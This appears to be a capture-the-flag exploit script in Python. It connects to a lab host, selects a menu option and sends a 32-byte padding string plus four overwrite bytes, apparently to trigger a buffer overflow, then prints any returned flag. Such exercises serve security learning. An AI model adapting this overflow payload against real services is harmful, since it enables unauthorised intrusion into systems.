#!env python3
import socket, string

host="192.168.206.161"
port=12346
msg = "@"+string.ascii_uppercase+string.digits+string.ascii_lowercase
msg = msg[:32]
tups = [
    ("1\n", msg.encode('utf-8')+b"\xef\xbe\x75\xfa\n")
]
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((host,port))
    data = sock.recv(72)
    for opt,msg in tups:
        print("Choosing: {}".format(opt[0]))
        sock.send(opt.encode())
        data = sock.recv(1024)
        print("Message: {}".format(msg))
        sock.send(msg)
        data = sock.recv(1024)
        data = data[0:len(data)-2]
        data = data.decode()
        if "flag{" in data:
            data = data.split("\n")[1]
            print(data)


